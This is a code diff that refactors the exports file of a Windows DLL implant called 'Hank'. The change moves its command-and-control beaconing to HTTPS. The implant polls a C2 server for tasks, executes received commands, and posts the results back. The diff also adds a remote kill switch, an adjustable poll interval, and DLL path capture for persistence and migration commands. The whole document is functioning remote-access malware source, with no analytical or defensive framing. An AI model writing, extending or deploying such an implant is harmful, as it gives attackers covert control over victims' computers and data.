@@ -1,306 +1,288 @@
 #define Hank_EXPORTS
 #include "exports.h"
 
-#define C2_HOST_BUFFER_LENGTH 64U
-#define C2_PORT_BUFFER_LENGTH 16U
-#define POLL_THREAD_WAIT_TIMEOUT_MS 5000U
-#define POLL_LOOP_STOPPED 0L
-#define POLL_LOOP_RUNNING 1L
-#define TERMINATION_NOT_REQUESTED 0L
-#define TERMINATION_REQUESTED 1L
-
-static WCHAR G_C2Host[C2_HOST_BUFFER_LENGTH] = DEFAULT_C2_HOST;
-static WCHAR G_C2Port[C2_PORT_BUFFER_LENGTH] = DEFAULT_C2_PORT;
-static HANDLE G_PollThread = NULL;
-static volatile LONG G_ShouldRun = POLL_LOOP_STOPPED;
-static volatile LONG G_TerminationRequested = TERMINATION_NOT_REQUESTED;
-
-/**
- * @brief Releases the global polling thread handle.
+/*
+ * exports.c - DLL entry points and the HTTPS beaconing loop.
  *
- * If requested, this helper waits for the polling thread to exit before
- * closing the handle, unless it is running on that same thread. The handle
- * pointer is cleared atomically so only one caller performs the final close.
+ * Each poll cycle now makes two independent HTTPS round-trips:
  *
- * @param waitForExit TRUE to wait for the thread to exit before closing.
+ *   1. POST /beacon  body: TLV(MSG_AGENT_GET_TASK)
+ *      Response body: TLV(MSG_SERVER_TASK) or TLV(MSG_SERVER_NO_TASK)
  *
- * @return VOID
+ *   2. POST /beacon  body: TLV(MSG_AGENT_POST_RESULT)   [only if task received]
+ *      Response body: TLV(MSG_SERVER_ACK)
+ *
+ * Each round-trip opens a fresh TCP connection and performs a full TLS
+ * handshake so the server sees clean, stateless HTTPS requests.
  */
+
+#define C2_HOST_BUFFER_LENGTH    64U
+#define C2_PORT_BUFFER_LENGTH    16U
+#define POLL_THREAD_WAIT_TIMEOUT_MS 5000U
+#define POLL_LOOP_STOPPED        0L
+#define POLL_LOOP_RUNNING        1L
+#define TERMINATION_NOT_REQUESTED 0L
+#define TERMINATION_REQUESTED    1L
+#define KILL_NOT_PENDING         0L
+#define KILL_PENDING             1L
+
+static WCHAR          G_C2Host[C2_HOST_BUFFER_LENGTH] = DEFAULT_C2_HOST;
+static WCHAR          G_C2Port[C2_PORT_BUFFER_LENGTH] = DEFAULT_C2_PORT;
+static WCHAR          G_DllPath[MAX_PATH] = { 0 };
+static HANDLE         G_PollThread = NULL;
+static volatile LONG  G_ShouldRun = POLL_LOOP_STOPPED;
+static volatile LONG  G_TerminationRequested = TERMINATION_NOT_REQUESTED;
+static volatile LONG  G_KillPending = KILL_NOT_PENDING;
+static volatile LONG  G_PollIntervalMs = (LONG)DEFAULT_POLL_INTERVAL_MS;
+
+/* ---------------------------------------------------------------------------
+ * Internal helpers
+ * ------------------------------------------------------------------------- */
+
 static VOID ClosePollThreadHandle(BOOL waitForExit)
 {
-	HANDLE pollThread = (HANDLE)InterlockedExchangePointer(
-		(PVOID volatile*)&G_PollThread,
-		NULL
-	);
+    HANDLE pollThread = (HANDLE)InterlockedExchangePointer(
+        (PVOID volatile*)&G_PollThread, NULL);
 
-	if (pollThread == NULL)
-	{
-		return;
-	}
+    if (pollThread == NULL) return;
 
-	if (waitForExit && GetCurrentThreadId() != GetThreadId(pollThread))
-	{
-		(void)WaitForSingleObject(pollThread, POLL_THREAD_WAIT_TIMEOUT_MS);
-	}
+    if (waitForExit && GetCurrentThreadId() != GetThreadId(pollThread))
+    {
+        (void)WaitForSingleObject(pollThread, POLL_THREAD_WAIT_TIMEOUT_MS);
+    }
 
-	CloseHandle(pollThread);
+    CloseHandle(pollThread);
 }
 
-/**
- * @brief Sends a task result back to the polling server.
- *
- * @param sock The active polling socket.
- * @param taskId The server-assigned task identifier.
- * @param commandId The executed command identifier.
- * @param commandStatus The numeric command result status.
- * @param resultData The optional command result bytes.
- * @param resultLength The number of result bytes.
- *
- * @return TRUE on success, or FALSE if the send fails.
- */
-static BOOL SendTaskResult(
-	SOCKET sock,
-	DWORD taskId,
-	DWORD commandId,
-	DWORD commandStatus,
-	CONST PBYTE resultData,
-	DWORD resultLength
-)
-{
-	TASK_RESULT_HEADER resultHeader = { 0 };
-	PBYTE payload = NULL;
-	DWORD payloadLength = sizeof(resultHeader) + resultLength;
-	BOOL success = FALSE;
-
-	resultHeader.agentId = DEFAULT_AGENT_ID;
-	resultHeader.taskId = taskId;
-	resultHeader.commandId = commandId;
-	resultHeader.status = commandStatus;
-	resultHeader.resultLength = resultLength;
-
-	payload = (PBYTE)ImplantHeapAlloc(payloadLength);
-	if (payload == NULL)
-	{
-		return FALSE;
-	}
-
-	CopyMemory(payload, &resultHeader, sizeof(resultHeader));
-	if (resultLength > 0 && resultData != NULL)
-	{
-		CopyMemory(payload + sizeof(resultHeader), resultData, resultLength);
-	}
-
-	success = SendTlvMessage(sock, MSG_AGENT_POST_RESULT, payloadLength, payload);
-	ImplantHeapFree(payload);
-
-	return success;
-}
-
-/**
- * @brief Executes a single poll cycle against the task server.
- *
- * The agent requests one task, executes it if present, posts the result, and
- * then disconnects.
- *
- * @return VOID
- */
 static VOID PollServerOnce(VOID)
 {
-	AGENT_GET_TASK_REQUEST getTaskRequest = { DEFAULT_AGENT_ID };
-	TLV_MESSAGE responseMessage = { 0 };
-	SOCKET sock = INVALID_SOCKET;
-	PBYTE commandResult = NULL;
-	DWORD commandResultLength = 0;
-	DWORD commandStatus = NO_ERROR;
+    AGENT_GET_TASK_REQUEST getTaskRequest;
+    TLS_CONTEXT            ctx = { 0 };
+    TLV_MESSAGE            taskMsg = { 0 };
+    PBYTE                  commandResult = NULL;
+    DWORD                  commandResultLength = 0;
+    DWORD                  commandStatus = NO_ERROR;
+    DWORD                  taskId = 0;
+    DWORD                  commandId = 0;
+    TASK_HEADER* taskHeader = NULL;
+    PBYTE                  taskArgs = NULL;
 
-	if (!NetworkInit(G_C2Host, G_C2Port, &sock))
-	{
-		return;
-	}
+    getTaskRequest.agentId = DEFAULT_AGENT_ID;
 
-	if (!SendTlvMessage(
-		sock,
-		MSG_AGENT_GET_TASK,
-		sizeof(getTaskRequest),
-		(CONST PBYTE)&getTaskRequest
-	))
-	{
-		goto cleanup;
-	}
+    /* ---- Round-trip 1: request a task ------------------------------------ */
+    if (!NetworkInit(G_C2Host, G_C2Port, &ctx)) return;
 
-	if (!RecvMessage(sock, &responseMessage))
-	{
-		goto cleanup;
-	}
+    if (!HttpSendTlvRoundTrip(
+        &ctx, G_C2Host,
+        MSG_AGENT_GET_TASK,
+        sizeof(getTaskRequest),
+        (CONST PBYTE) & getTaskRequest,
+        &taskMsg))
+    {
+        TlsCleanup(&ctx);
+        return;
+    }
 
-	if (responseMessage.type == MSG_SERVER_NO_TASK)
-	{
-		goto cleanup;
-	}
+    TlsCleanup(&ctx);
 
-	if (responseMessage.type == MSG_SERVER_TASK)
-	{
-		TASK_HEADER* taskHeader = NULL;
-		PBYTE taskArgs = NULL;
+    if (taskMsg.type != MSG_SERVER_TASK ||
+        taskMsg.length < sizeof(TASK_HEADER))
+    {
+        FreeTlvMessage(&taskMsg);
+        return;
+    }
 
-		if (responseMessage.length < sizeof(TASK_HEADER))
-		{
-			goto cleanup;
-		}
+    /* ---- Execute the received task --------------------------------------- */
+    taskHeader = (TASK_HEADER*)taskMsg.value;
+    taskArgs = taskMsg.value + sizeof(TASK_HEADER);
 
-		taskHeader = (TASK_HEADER*)responseMessage.value;
-		taskArgs = responseMessage.value + sizeof(TASK_HEADER);
+    taskId = taskHeader->taskId;
+    commandId = taskHeader->commandId;
 
-		commandStatus = ExecuteCommandById(
-			taskHeader->commandId,
-			taskHeader->argLength,
-			taskArgs,
-			&commandResult,
-			&commandResultLength
-		);
+    commandStatus = ExecuteCommandById(
+        taskHeader->commandId,
+        taskHeader->argLength,
+        taskArgs,
+        &commandResult,
+        &commandResultLength);
 
-		FreeTlvMessage(&responseMessage);
-		RtlSecureZeroMemory(&responseMessage, sizeof(responseMessage));
+    FreeTlvMessage(&taskMsg);
 
-		if (!SendTaskResult(
-			sock,
-			taskHeader->taskId,
-			taskHeader->commandId,
-			commandStatus,
-			commandResult,
-			commandResultLength
-		))
-		{
-			goto cleanup;
-		}
+    /* ---- Round-trip 2: post the result ----------------------------------- */
+    /* Always post the result, even when kill is pending, so the operator
+     * actually sees "completed" for the kill task before the implant exits. */
+    {
+        TASK_RESULT_HEADER resultHeader = { 0 };
+        DWORD              payloadLen;
+        PBYTE              payload = NULL;
+        TLS_CONTEXT        ctx2 = { 0 };
+        TLV_MESSAGE        ackMsg = { 0 };
 
-		(void)RecvMessage(sock, &responseMessage);
-	}
+        resultHeader.agentId = DEFAULT_AGENT_ID;
+        resultHeader.taskId = taskId;
+        resultHeader.commandId = commandId;
+        resultHeader.status = commandStatus;
+        resultHeader.resultLength = commandResultLength;
 
-cleanup:
-	if (commandResult != NULL)
-	{
-		ImplantHeapFree(commandResult);
-	}
+        payloadLen = sizeof(resultHeader) + commandResultLength;
+        payload = (PBYTE)ImplantHeapAlloc(payloadLen);
 
-	FreeTlvMessage(&responseMessage);
-	NetworkCleanup(sock);
+        if (payload != NULL)
+        {
+            CopyMemory(payload, &resultHeader, sizeof(resultHeader));
+            if (commandResultLength > 0 && commandResult != NULL)
+            {
+                CopyMemory(
+                    payload + sizeof(resultHeader),
+                    commandResult,
+                    commandResultLength);
+            }
+
+            if (NetworkInit(G_C2Host, G_C2Port, &ctx2))
+            {
+                (VOID)HttpSendTlvRoundTrip(
+                    &ctx2, G_C2Host,
+                    MSG_AGENT_POST_RESULT,
+                    payloadLen,
+                    payload,
+                    &ackMsg);
+                FreeTlvMessage(&ackMsg);
+                TlsCleanup(&ctx2);
+            }
+
+            ImplantHeapFree(payload);
+        }
+    }
+
+    if (commandResult != NULL)
+    {
+        ImplantHeapFree(commandResult);
+    }
+
+    /* ---- Apply deferred kill AFTER the result has been posted ------------ */
+    if (G_KillPending == KILL_PENDING)
+    {
+        RequestImplantTermination();
+    }
 }
 
-/**
- * @brief Polling loop for the implant runtime.
- *
- * The thread performs one poll cycle, sleeps for the configured interval, and
- * then repeats until the implant is terminated.
- *
- * @param parameter Unused.
- *
- * @return 0 when the polling loop exits.
- */
 static DWORD WINAPI PollThreadProc(LPVOID parameter)
 {
-	UNREFERENCED_PARAMETER(parameter);
+    UNREFERENCED_PARAMETER(parameter);
 
-	while (
-		G_ShouldRun == POLL_LOOP_RUNNING &&
-		!IsImplantTerminationRequested()
-	)
-	{
-		PollServerOnce();
+    while (G_ShouldRun == POLL_LOOP_RUNNING && !IsImplantTerminationRequested())
+    {
+        PollServerOnce();
 
-		if (!IsImplantTerminationRequested())
-		{
-			Sleep(DEFAULT_POLL_INTERVAL_MS);
-		}
-	}
+        if (!IsImplantTerminationRequested())
+        {
+            Sleep((DWORD)G_PollIntervalMs);
+        }
+    }
 
-	ClosePollThreadHandle(FALSE);
-	return 0;
+    ClosePollThreadHandle(FALSE);
+    return 0;
 }
+
+/* ---------------------------------------------------------------------------
+ * DLL entry point
+ * ------------------------------------------------------------------------- */
 
 BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
 {
-	UNREFERENCED_PARAMETER(instance);
-	UNREFERENCED_PARAMETER(reason);
-	UNREFERENCED_PARAMETER(reserved);
+    UNREFERENCED_PARAMETER(reserved);
 
-	return TRUE;
+    if (reason == DLL_PROCESS_ATTACH)
+    {
+        /* Capture full DLL path for persist / migrate commands. */
+        GetModuleFileNameW(instance, G_DllPath, MAX_PATH);
+    }
+
+    return TRUE;
 }
+
+/* ---------------------------------------------------------------------------
+ * Exported API
+ * ------------------------------------------------------------------------- */
 
 Hank_API BOOL HankInitialize(PCWSTR host, PCWSTR port)
 {
-	if (IsImplantTerminationRequested())
-	{
-		return FALSE;
-	}
+    if (IsImplantTerminationRequested()) return FALSE;
 
-	if (host != NULL)
-	{
-		(void)wcsncpy_s(G_C2Host, ARRAYSIZE(G_C2Host), host, _TRUNCATE);
-	}
+    if (host != NULL)
+    {
+        (void)wcsncpy_s(G_C2Host, ARRAYSIZE(G_C2Host), host, _TRUNCATE);
+    }
 
-	if (port != NULL)
-	{
-		(void)wcsncpy_s(G_C2Port, ARRAYSIZE(G_C2Port), port, _TRUNCATE);
-	}
+    if (port != NULL)
+    {
+        (void)wcsncpy_s(G_C2Port, ARRAYSIZE(G_C2Port), port, _TRUNCATE);
+    }
 
-	if (!NetworkStartup())
-	{
-		return FALSE;
-	}
+    if (!NetworkStartup()) return FALSE;
 
-	return TRUE;
+    return TRUE;
 }
 
 Hank_API BOOL HankStart(VOID)
 {
-	HANDLE pollThread = NULL;
+    HANDLE pollThread;
 
-	if (IsImplantTerminationRequested())
-	{
-		return FALSE;
-	}
+    if (IsImplantTerminationRequested()) return FALSE;
+    if (G_PollThread != NULL) return TRUE;
 
-	if (G_PollThread != NULL)
-	{
-		return TRUE;
-	}
+    InterlockedExchange(&G_ShouldRun, POLL_LOOP_RUNNING);
+    pollThread = CreateThread(NULL, 0, PollThreadProc, NULL, 0, NULL);
+    if (pollThread == NULL)
+    {
+        InterlockedExchange(&G_ShouldRun, POLL_LOOP_STOPPED);
+        return FALSE;
+    }
 
-	InterlockedExchange(&G_ShouldRun, POLL_LOOP_RUNNING);
-	pollThread = CreateThread(
-		NULL,
-		0,
-		PollThreadProc,
-		NULL,
-		0,
-		NULL
-	);
-	if (pollThread == NULL)
-	{
-		InterlockedExchange(&G_ShouldRun, POLL_LOOP_STOPPED);
-		return FALSE;
-	}
-
-	G_PollThread = pollThread;
-	return TRUE;
+    G_PollThread = pollThread;
+    return TRUE;
 }
 
 Hank_API VOID HankStop(VOID)
 {
-	RequestImplantTermination();
-	ClosePollThreadHandle(TRUE);
-	NetworkShutdown();
-
-	CheckHeapBalance();
+    RequestImplantTermination();
+    ClosePollThreadHandle(TRUE);
+    NetworkShutdown();
+    CheckHeapBalance();
 }
 
 VOID RequestImplantTermination(VOID)
 {
-	InterlockedExchange(&G_TerminationRequested, TERMINATION_REQUESTED);
-	InterlockedExchange(&G_ShouldRun, POLL_LOOP_STOPPED);
+    InterlockedExchange(&G_TerminationRequested, TERMINATION_REQUESTED);
+    InterlockedExchange(&G_ShouldRun, POLL_LOOP_STOPPED);
 }
 
 BOOL IsImplantTerminationRequested(VOID)
 {
-	return (G_TerminationRequested == TERMINATION_REQUESTED);
+    return (G_TerminationRequested == TERMINATION_REQUESTED);
+}
+
+/* ---------------------------------------------------------------------------
+ * Implant runtime control (called by command handlers)
+ * ------------------------------------------------------------------------- */
+
+VOID SetPollInterval(DWORD ms)
+{
+    InterlockedExchange(&G_PollIntervalMs, (LONG)ms);
+}
+
+VOID SetKillPending(VOID)
+{
+    InterlockedExchange(&G_KillPending, KILL_PENDING);
+}
+
+VOID GetC2Config(PWSTR hostBuf, DWORD hostBufChars, PWSTR portBuf, DWORD portBufChars)
+{
+    (VOID)wcsncpy_s(hostBuf, hostBufChars, G_C2Host, _TRUNCATE);
+    (VOID)wcsncpy_s(portBuf, portBufChars, G_C2Port, _TRUNCATE);
+}
+
+PCWSTR GetImplantDllPath(VOID)
+{
+    return G_DllPath;
 }
